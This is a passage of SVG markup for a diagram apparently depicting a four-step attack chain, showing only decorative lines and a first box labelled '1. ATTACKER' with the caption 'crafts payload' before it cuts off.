  <line x1="835" y1="140" x2="835" y2="118" stroke="#c0392b" stroke-width="2" opacity="0.7"/>
  <line x1="855" y1="140" x2="855" y2="112" stroke="#c0392b" stroke-width="2" opacity="0.7"/>
  <line x1="875" y1="140" x2="875" y2="118" stroke="#c0392b" stroke-width="2" opacity="0.7"/>
  <!-- Attack chain: 4 steps in a path -->
  <!-- Step 1 -->
  <rect x="760" y="255" width="108" height="36" rx="5" fill="rgba(192,57,43,0.15)" stroke="#c0392b" stroke-width="1.5"/>
  <text x="814" y="272" font-size="10" fill="#ff8a80" font-family="monospace" text-anchor="middle">1. ATTACKER</text>
  <text x="814" y="284" font-size="9" fill="rgba(255,255,255,0.5)" font-family="monospace" text-anchor="middle">crafts payload</text>
  <!-- Arrow 1 -->
  <line x1="868" y1="273" x2="896" y2="273" stroke="#d35400" stroke-width="2" marker-end="url(#arrowhead)"/>
  <!-- Step 2 -->
